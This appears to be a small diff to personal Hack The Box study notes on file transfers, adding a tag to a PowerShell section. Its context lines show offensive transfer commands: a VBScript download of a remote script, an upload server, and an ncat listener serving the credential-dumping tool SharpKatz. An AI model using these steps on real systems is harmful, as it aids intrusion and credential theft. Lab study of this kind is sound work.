@@ -73,7 +73,6 @@ C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShel
 ```
 
 ## Upload
-
 ```shell
 python3 -m uploadserver 
 ```
@@ -124,6 +123,7 @@ jabrach@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
 ```
 
 #### PowerShell Session File Transfer
+[[powershell]]
 ```powershell
 PS C:\htb> whoami
 
